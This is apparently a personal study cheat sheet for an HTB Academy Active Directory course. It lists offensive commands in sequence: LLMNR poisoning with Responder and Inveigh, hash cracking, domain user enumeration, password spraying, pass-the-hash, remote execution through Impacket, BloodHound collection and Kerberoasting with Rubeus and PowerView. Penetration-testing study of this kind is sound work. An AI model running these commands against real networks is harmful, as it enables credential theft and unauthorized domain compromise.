# Active Directory — Initial Enumeration

> HTB Academy personal cheat sheet  
> Focus: commands first, short explanations, common usage  
> No walkthroughs, no flags

---

## Remote Access (SSH / RDP)

Quick reminder for common remote login commands and **exact syntax**.

---

## SSH

**Purpose:**  
Remote shell access to Linux / Unix systems.

---

### Basic syntax
```bash
ssh <username>@<target_ip/host>
```

Example:
```bash
ssh bob@10.10.10.5
```

---

## RDP (xfreerdp)

**Purpose:**  
Remote Desktop access to Windows systems.

⚠️ **Important:**  
- `xfreerdp` uses **`/u:`** (forward slash)  
- NOT `\u:`  
- This is NOT Linux-style flags

---

### Basic RDP login
```bash
xfreerdp /u:<username> /p:<password> /v:<target_ip>
```

Example:
```bash
xfreerdp /u:Administrator /p:Password123 /v:10.10.10.5
```

---

### RDP with domain
```bash
xfreerdp /u:<DOMAIN>\<username> /p:<password> /v:<target_ip>
```

Example:
```bash
xfreerdp /u:INLANEFREIGHT\Administrator /p:Password123 /v:10.10.10.5
```

---

### Common useful flags
```bash
/clipboard      # Enable clipboard sharing
/dynamic-resolution
/drive:share,/tmp
```

Example:
```bash
xfreerdp /u:Administrator /p:Password123 /v:10.10.10.5 /clipboard /dynamic-resolution
```
---

# scp

Securely copy files between hosts over SSH. Commonly used to transfer artifacts (e.g. Kerberos TGS hashes, logs, dumps) from remote machines to a local analysis environment.

---

## Usage

```bash
scp <user>@<remote_host>:<remote_path> <local_path>
```
Example(Transfer a Kerberoast TGS hash file generated during Kerberos enumeration from the HTB attack box to the local VM): 
```bash
scp htb-student@<ATTACK_BOX_IP>:/home/htb-student/sqldev_tgs .
```

---

# fping

## Purpose
Fast ICMP ping sweep to discover which hosts are alive in a subnet.

---

## Command
```bash
fping -asgq 172.16.5.0/23
```

---

## Responder

**Purpose:**  
LLMNR / NBT-NS / mDNS tool used for:
- Passive traffic sniffing (safe, non-intrusive)
- Name-resolution poisoning (active attack, noisy)

Responder can be used **without poisoning** by enabling analyze mode.

---

### Help / options
```bash
responder -h
```

---

### Passive sniff (recommended early)
```bash
sudo responder -I <iface> -A
```

Example:
```bash
sudo responder -I ens224 -A
```

**When to use:**  
Use this mode when you want to:
- Learn hostnames on the network
- Observe name-resolution traffic
- Avoid active poisoning or interference

---

## tcpdump

**Purpose:**  
Command-line packet capture tool for quick traffic visibility and PCAP generation.

---

### Help
```bash
tcpdump -h
man tcpdump
```

---

### Live capture on interface
```bash
sudo tcpdump -i <iface>
```

Example:
```bash
sudo tcpdump -i ens224
```

---

### Save traffic to file
```bash
sudo tcpdump -i <iface> -w capture.pcap
```

Example:
```bash
sudo tcpdump -i ens224 -w initial_enum.pcap
```

**When to use:**  
- No GUI available
- Want to review traffic later in Wireshark
- Need lightweight packet inspection

---

## Notes / Reminders

- Passive tools first before loud scans
- Save PCAPs and scan outputs for reuse
- Ignore tools HTB says “will be covered later”

---

## Hashcat (Cracking Captured Hashes)

**Purpose:**  
Offline password cracking tool used to recover **cleartext passwords** from captured hashes  
(e.g. NetNTLMv2 obtained via Responder).

---

### Identify hash type
When hashes come from **Responder**, they are most commonly:

- **NetNTLMv2** → Hashcat mode **5600**

---

### Basic syntax
```bash
hashcat -m <mode> <hash_file> <wordlist>
```

---

### NetNTLMv2 (Responder hashes)
```bash
hashcat -m 5600 <hash_file> <wordlist>
```

Example:
```bash
hashcat -m 5600 forend_ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

### Resume a cracked / interrupted session
```bash
hashcat --restore
```

---

### Show cracked passwords
```bash
hashcat -m 5600 <hash_file> --show
```

Example:
```bash
hashcat -m 5600 forend_ntlmv2.txt --show
```

---

## Workflow Reminder (Responder → Hashcat)

1) Run Responder  
2) Capture NetNTLMv2 hash  
3) Locate hash file:
```
/usr/share/responder/logs/
```
4) Crack with:
```bash
hashcat -m 5600 <hash_file> /usr/share/wordlists/rockyou.txt
```
5) Use recovered password for:
- SSH
- RDP
- SMB
- WinRM

---

## Notes / Gotchas

- NetNTLMv2 **cannot** be used for pass-the-hash  
- Must be cracked to obtain cleartext password  
- Weak passwords crack fast, strong ones may take very long

---

## LLMNR / NBT-NS Poisoning — from Windows (Inveigh)

> Windows-based alternative to Responder  
> Use when your attack host is Windows or you have compromised a Windows machine

---

## Inveigh

**Purpose:**  
Perform LLMNR / NBT-NS poisoning and credential capture **from a Windows host**.  
Functionally similar to Responder, but designed for Windows environments.

**When to use:**
- Attack box is Windows
- Client provides a Windows testing VM
- You gained local admin on a Windows host and want to pivot

---

## Versions

### PowerShell version
- Legacy
- Still usable
- Loaded as a module

### C# version (InveighZero)
- Actively maintained
- Compiled executable (`.exe`)
- Better performance
- **Preferred version**

---

## Start Inveigh (PowerShell version)

```powershell
Import-Module .\Inveigh.ps1
```

List available parameters:
```powershell
(Get-Command Invoke-Inveigh).Parameters
```

Start poisoning with console + file output:
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

---

## Start Inveigh (C# version – recommended)

```powershell
.\Inveigh.exe
```

- Options with `[+]` are enabled
- Options with `[ ]` are disabled
- Press `ESC` to enter interactive console

---

## Interactive Console (Key Advantage)

Inveigh provides a **live interactive console** while running.

Useful commands:
```text
GET NTLMV2
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
GET CLEARTEXT
STOP
```

**Why this matters:**
- Quickly build a **user list**
- See which accounts are worth cracking
- Manage output without stopping the tool

---

## Output Location

Captured hashes and logs are written to:
```text
C:\Tools
```

---

## Notes / Gotchas

- Same attack concept as Responder, different platform
- Captured hashes are typically **NetNTLMv2**
- Hashes must be cracked offline (covered elsewhere)
- Useful for post-exploitation or Windows-only scenarios

---

## Enumerating Password Policy

**Purpose:**  
Retrieve the domain password policy to:
- Avoid account lockouts
- Plan safe password spraying intervals
- Choose realistic password candidates

---

## From Linux — SMB NULL Session (No Credentials)

### rpcclient
```bash
rpcclient -U "" -N <dc_ip>
```

Check domain info:
```bash
querydominfo
```

Get password policy:
```bash
getdompwinfo
```

**Useful fields:**
- min_password_length
- password complexity
- lockout threshold

---

### enum4linux
```bash
enum4linux -P <dc_ip>
```

---

### enum4linux-ng (cleaner output + export)
```bash
enum4linux-ng -P <dc_ip> -oA <output_prefix>
```

Outputs:
- JSON
- YAML

Useful for later automation.

---

## From Linux — LDAP Anonymous Bind (If Allowed)

```bash
ldapsearch -x -H ldap://<dc_ip> \
-b "DC=<DOMAIN>,DC=<TLD>" \
-s sub "*" | grep -i pwd
```

Look for:
- minPwdLength
- lockoutThreshold
- pwdHistoryLength
- pwdProperties

---

## From Windows — NULL Session

```cmd
net use \\<dc_hostname>\ipc$ "" /u:""
```

If successful → NULL session allowed.

---

## From Windows — Built-in Command (Authenticated)

```cmd
net accounts
```

Key output:
- Minimum password length
- Lockout threshold
- Lockout duration
- Password history length

---

## From Windows — PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

Useful fields:
- MinimumPasswordLength
- PasswordComplexity
- LockoutBadCount
- LockoutDuration

---

## From Linux — CrackMapExec (Credentialed)

```bash
crackmapexec smb <dc_ip> -u <user> -p <password> --pass-pol
```

---

## How to Use This Info (Mental Checklist)

- Lockout threshold = **5**
  → Spray **2–3 passwords max**
- Lockout duration = **30 minutes**
  → Wait **31+ minutes** between sprays
- Min password length = **8**
  → Weak but “complex” passwords likely
- Password history = **24**
  → Old reused passwords unlikely

---

## Spray Safety Rule

**Never lock accounts. Ever.**  
If unsure about policy:
- One spray only
- Long wait
- Ask client if allowed

---

## Password Spraying — Building a Target User List

**Purpose:**  
Create a list of **valid domain usernames** to use for password spraying  
(without locking accounts or guessing blindly).

This step always comes **before** spraying.

---

## Sources for Valid Users (Priority Order)

1) SMB NULL session / LDAP anonymous bind  
2) Kerberos-based enumeration (Kerbrute)  
3) Credentialed enumeration (if creds exist)  
4) External sources (LinkedIn, email formats) — last resort

---

## From Linux — SMB NULL Session

### rpcclient
```bash
rpcclient -U "" -N <dc_ip>
```

Enumerate users:
```bash
enumdomusers
```

---

### enum4linux (extract usernames only)
```bash
enum4linux -U <dc_ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

---

## From Linux — LDAP Anonymous Bind

### ldapsearch
```bash
ldapsearch -x -H ldap://<dc_ip> \
-b "DC=<DOMAIN>,DC=<TLD>" \
-s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

---

### windapsearch (cleaner)
```bash
./windapsearch.py --dc-ip <dc_ip> -u "" -U
```

---

## From Linux — CrackMapExec (User Enumeration)

```bash
crackmapexec smb <dc_ip> --users
```

**Extra value:**
- Shows `badpwdcount`
- Shows `baddpwdtime`

Use this to **remove risky accounts** close to lockout.

---

## Kerberos-Based Enumeration (No Lockout Risk)

### Kerbrute — Username Enumeration

**Purpose:**  
Validate usernames using Kerberos **without causing logon failures**.

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
```

Example:
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

**Notes:**
- Very fast
- Does NOT lock accounts
- Generates Kerberos TGT requests (event ID 4768)

---

## From Windows — NULL Session

```cmd
net use \\<dc_hostname>\ipc$ "" /u:""
```

If successful → anonymous enumeration may be possible.

---

## From Windows — Credentialed Enumeration

### CrackMapExec (Windows variants exist)
```bash
crackmapexec smb <dc_ip> -u <user> -p <password> --users
```

---

## Hygiene & Safety Rules (IMPORTANT)

- Always check password policy first
- Remove accounts with high `badpwdcount`
- Keep a log of:
  - Users sprayed
  - Passwords used
  - Time / date
  - Domain Controller targeted
- Never spray blindly

---

## Output Goal

Final user list format:
```text
username1
username2
username3
```

One username per line. No domains. No noise.

This list feeds directly into password spraying.

---

## Password Spraying — Internal (from Linux)

**Purpose:**  
Test **one password** against **many valid domain users** to identify weak or reused credentials  
while minimizing lockout risk.

⚠️ Always enumerate password policy and build a clean user list first.

---

## Method 1 — rpcclient (Bash one-liner)

**Why:**  
- Built-in
- No extra tooling
- Good signal if filtered correctly

---

### Spray with rpcclient
```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%<password>" -c "getusername;quit" <dc_ip> | grep Authority
done
```

Example:
```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

**Success indicator:**
```text
Authority Name: <DOMAIN>
```

---

## Method 2 — Kerbrute (recommended)

**Why:**  
- Fast
- Clean output
- Kerberos-based
- Easy to spot valid logins

---

### Spray with Kerbrute
```bash
kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist> <password>
```

Example:
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

**Success indicator:**
```text
[+] VALID LOGIN: username@domain:password
```

---

## Method 3 — CrackMapExec (filtered)

**Why:**  
- Very versatile
- Easy validation
- Good for chaining follow-up checks

---

### Spray with CrackMapExec
```bash
crackmapexec smb <dc_ip> -u valid_users.txt -p <password> | grep +
```

Example:
```bash
crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

---

### Validate discovered credentials
```bash
crackmapexec smb <dc_ip> -u <user> -p <password>
```

Example:
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

---

## Local Administrator Password Reuse (Advanced)

**Purpose:**  
Check whether **local administrator passwords** are reused across multiple hosts.

Common in environments using:
- Gold images
- Poor password hygiene
- No LAPS

---

### Spray NTLM hash locally (safe mode)
```bash
crackmapexec smb <subnet> -u administrator -H <ntlm_hash> --local-auth | grep +
```

Example:
```bash
crackmapexec smb 172.16.5.0/23 -u administrator -H <hash> --local-auth | grep +
```

**Important:**
- `--local-auth` prevents domain lockouts
- Without it → high risk

---

## Spray Safety Rules (DO NOT SKIP)

- One password per spray round
- Respect lockout thresholds
- Remove users with high `badpwdcount`
- Log:
  - Password used
  - Time
  - Users tested
- Stop immediately after first hit

---

## Outcome

Successful spray gives:
- Cleartext domain credentials
- Initial foothold for:
  - SMB
  - RDP
  - WinRM
  - Further enumeration

---

## Password Spraying — Internal (from Windows)

**Purpose:**  
Perform internal password spraying **from a domain-joined Windows host** to obtain
valid domain credentials with minimal lockout risk.

Best used when:
- You already have a Windows foothold
- The host is domain-joined
- You want built-in policy awareness and user filtering

---

## DomainPasswordSpray (PowerShell)

**Why this tool is powerful:**
- Auto-enumerates domain users
- Auto-detects password policy
- Excludes users near lockout
- Handles spray timing safely

---

## Import the module

```powershell
Import-Module .\DomainPasswordSpray.ps1
```

---

## Basic password spray (single password)

```powershell
Invoke-DomainPasswordSpray -Password <password>
```

Example:
```powershell
Invoke-DomainPasswordSpray -Password Welcome1
```

---

## Write successful results to file

```powershell
Invoke-DomainPasswordSpray -Password <password> -OutFile <output_file>
```

Example:
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success
```

---

## What the tool does automatically

- Detects fine-grained password policies
- Finds smallest lockout threshold
- Removes disabled users
- Removes users within **1 attempt of lockout**
- Sets safe wait time between attempts
- Confirms before spraying

Example output indicators:
```text
[*] Removing users within 1 attempt of locking out
[*] Created a userlist containing <N> users
[*] SUCCESS! User:<username> Password:<password>
```

---

## Spray Confirmation Prompt

Before execution, the tool asks:
```text
Are you sure you want to perform a password spray?
```

This is your last chance to abort if policy looks risky.

---

## Alternative: Kerbrute on Windows

Kerbrute can also be used from Windows if needed.

```powershell
kerbrute passwordspray -d <domain> --dc <dc_ip> <userlist> <password>
```

Use when:
- Not domain-joined
- You already have a clean user list

---

## Output & Results

- Successful credentials are written to the specified output file
- Use recovered credentials for:
  - SMB
  - RDP
  - WinRM
  - Credentialed enumeration

---

## Spray Safety Rules (DO NOT SKIP)

- One password per spray
- Respect lockout thresholds
- Trust DomainPasswordSpray’s filtering
- Stop immediately after first success
- Log:
  - Password used
  - Time
  - Target domain

---

## Outcome

A successful spray provides:
- Valid domain credentials
- Access to higher-privilege enumeration
- Entry point for lateral or vertical movement

---

## Credentialed Enumeration — from Linux

**Purpose:**  
Enumerate Active Directory **after obtaining valid domain credentials** to identify
privileged users, sessions, shares, and attack paths.

Prerequisite:
- Domain user credentials (cleartext or hash)
- Network access to Domain Controller

---

## CrackMapExec (NetExec)

**Main purpose:**  
Enumerate users, groups, sessions, and shares using valid credentials.

---

### Help menu

```bash
crackmapexec -h
crackmapexec smb -h
```

---

### Enumerate domain users

```bash
sudo crackmapexec smb <DC_IP> -u <user> -p <password> --users
```

Why useful:
- Shows `badPwdCount`
- Helps avoid account lockouts
- Builds safe target lists

---

### Enumerate domain groups

```bash
sudo crackmapexec smb <DC_IP> -u <user> -p <password> --groups
```

Look for:
- Domain Admins
- Backup Operators
- IT / Executives / Custom admin groups

---

### Find logged-on users (VERY important)

```bash
sudo crackmapexec smb <TARGET_IP> -u <user> -p <password> --loggedon-users
```

If you see:
```
(Pwn3d!)
```
➡️ You are **local admin** on that host.

Logged-in admins = **credential theft opportunity**.

---

### Enumerate SMB shares

```bash
sudo crackmapexec smb <TARGET_IP> -u <user> -p <password> --shares
```

Prioritise:
- Department Shares
- User Shares
- Archive / Backup shares

---

### Spider SMB shares (file discovery)

```bash
sudo crackmapexec smb <TARGET_IP> -u <user> -p <password> \
-M spider_plus --share '<SHARE_NAME>'
```

Output location:
```
/tmp/cme_spider_plus/<target_ip>.json
```

Look for:
- `.bat`
- `.ps1`
- `.config`
- Backup scripts
- Hardcoded creds

---

## SMBMap

**Main purpose:**  
Detailed SMB share enumeration & traversal.

---

### Check share access

```bash
smbmap -u <user> -p <password> -d <domain> -H <TARGET_IP>
```

---

### Recursive directory listing (folders only)

```bash
smbmap -u <user> -p <password> -d <domain> \
-H <TARGET_IP> -R '<SHARE_NAME>' --dir-only
```

---

## rpcclient

**Main purpose:**  
Low-level AD enumeration via MS-RPC.

---

### Connect (NULL session if allowed)

```bash
rpcclient -U "" -N <DC_IP>
```

Authenticated:
```bash
rpcclient -U <user>%<password> <DC_IP>
```

---

### Enumerate domain users + RIDs

```text
rpcclient $> enumdomusers
```

---

### Query user by RID

```text
rpcclient $> queryuser <RID>
```

Why RIDs matter:
- Built-in Administrator always RID **500**
- Helps identify renamed admin accounts

---

## Impacket Execution Tools

### psexec.py (SYSTEM shell)

**Purpose:**  
Full SYSTEM access (noisy, drops files).

```bash
psexec.py domain/user:'password'@<TARGET_IP>
```

---

### wmiexec.py (stealthier)

**Purpose:**  
Command execution via WMI (no file drop).

```bash
wmiexec.py domain/user:'password'@<TARGET_IP>
```

Runs as:
- The authenticated user (not SYSTEM)

---

## Windapsearch

**Main purpose:**  
LDAP enumeration of users, groups, privileges.

---

### Enumerate Domain Admins

```bash
python3 windapsearch.py --dc-ip <DC_IP> \
-u <user>@<domain> -p <password> --da
```

---

### Find all privileged users (nested groups)

```bash
python3 windapsearch.py --dc-ip <DC_IP> \
-u <user>@<domain> -p <password> -PU
```

This often reveals **hidden privilege escalation paths**.

---

## BloodHound.py

**Main purpose:**  
Graph-based attack path discovery.

---

### Collect ALL data

```bash
sudo bloodhound-python -u <user> -p <password> \
-d <domain> -ns <DC_IP> -c all
```

Output:
```
*.json files
```

---

### Next step (GUI)

- Upload JSON or ZIP into BloodHound GUI
- Run:
  - Shortest Paths to Domain Admins
  - Session-based privilege escalation
  - ACL abuse paths

---

## Key Takeaways

- CME = fast, targeted enumeration
- SMBMap = deep share analysis
- rpcclient = object-level AD data
- Windapsearch = privilege discovery
- BloodHound = **strategy & planning**

This phase sets up **lateral movement and privilege escalation**.

---

## Kerberoasting (from Linux) 🐧

### Concept (what you're actually doing)

- Kerberoasting targets **accounts with SPNs** (service accounts).
- Any domain user can request a **TGS (service ticket)** for an SPN.
- The returned ticket (**TGS-REP**) is encrypted in a way that allows **offline cracking**.

---

## GetUserSPNs.py (Impacket) — main workflow

### 1) Enumerate SPN accounts

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>
```

### 2) Request TGS tickets for cracking (all SPNs)
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request
```

### 3) Request TGS ticket for a specific SPN user
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER>
```

### 4) Save tickets to a file
```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request-user <SPN_USER> -outputfile <tgs_file>
```
Example:
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/sqldev:database! -request-user SAPService -outputfile SAPService_tgs
```

---

## Hashcat mode selection (minimal)

### How to identify the correct hashcat mode

Look at the prefix of the Kerberos hash:

- `$krb5tgs$23$...` → etype 23 (RC4-HMAC) → `-m 13100`
- `$krb5tgs$17$...` → etype 17 (AES128) → `-m 19600`
- `$krb5tgs$18$...` → etype 18 (AES256) → `-m 19700`

### Example (etype 23)

```bash
hashcat -m 13100 <tgs_file_or_hash> <wordlist>
```
---

## Kerberoasting (Windows) — Manual TGS request via .NET (no Rubeus)

### Purpose
Request a Kerberos service ticket (TGS) for a known SPN using .NET.  
This does **not** print a hash by itself — it only forces Windows to fetch the ticket into memory so it can later be extracted (e.g., using ticket extraction tools).

### Syntax
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```
Example
```powershell
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

---

### Kerberoasting — Bulk TGS request using setspn + PowerShell
Kerberoasting — Bulk TGS request using setspn + PowerShell
Purpose
Enumerate all SPNs in the domain and automatically request a TGS for each one.
```powershell
setspn.exe -T <DOMAIN> -Q */* |
Select-String '^CN' -Context 0,1 |
% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Example
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* |
Select-String '^CN' -Context 0,1 |
% { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

---

## Kerberoasting (Windows) — Exporting TGS hashes to CSV (PowerView)

### Purpose
Enumerate all SPN-enabled users, request their Kerberos service tickets (TGS), and export them in Hashcat format to a CSV file for offline cracking.

### Syntax
```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv <output_file> -NoTypeInformation
```
Example
```powershell
Get-DomainUser * -SPN |
Get-DomainSPNTicket -Format Hashcat |
Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

---

## Kerberoasting (Windows) — Using Rubeus

### Purpose
Automate Kerberoasting from a Windows host and control ticket format, encryption type, scope, and output cleanliness.

---

## Rubeus — Basic Kerberoast

### Syntax
```powershell
Rubeus.exe kerberoast
```

---

### Rubeus — Clean output for offline cracking
Purpose
Prevent Base64 wrapping and formatting issues when copying hashes.
```powershell
Rubeus.exe kerberoast /nowrap
```
### Rubeus — Target a specific user
```powershell
Rubeus.exe kerberoast /user:<username> /nowrap
```

### Rubeus — Filter high-value targets
Purpose
Only request tickets for privileged or sensitive accounts.
```powershell
Rubeus.exe kerberoast /ldapfilter:'<filter>' /nowrap
```
Example
```powershell
Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
Notes
* admincount=1 indicates protected or privileged accounts.
* Reduces noise and focuses on high-impact targets.

### Rubeus — Request RC4 tickets (faster cracking)
Purpose
Force the use of RC4 encryption when possible.
```powershell
Rubeus.exe kerberoast /tgtdeleg /nowrap
```
### Rubeus — Save tickets to a file
by adding /outfile:<filename> tag, ex.
```powershell
Rubeus.exe kerberoast /nowrap /outfile:tgs_hashes.txt
```
